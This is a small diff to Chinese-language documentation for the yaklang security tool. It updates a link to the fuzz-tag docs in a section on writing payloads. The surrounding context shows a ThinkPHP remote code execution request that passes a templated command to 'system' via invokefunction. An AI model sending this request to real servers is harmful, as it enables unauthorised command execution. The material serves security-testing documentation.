@@ -97,7 +97,7 @@ chechIcon1 = fn(rootUrl){
 
 ## paylaod
 
-可以通过[fuzz标签](https://www.yaklang.io/docs/buildinlibs/lib_fuzz#fuzz-标签定义以及使用)去写payload，如
+可以通过[fuzz标签](https://www.yaklang.io/api-manual/buildinlibs/lib_fuzz#fuzz-标签定义以及使用)去写payload，如
 
 ```go
 GET /index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]={{url({{params(cmd)}})}} HTTP/1.1
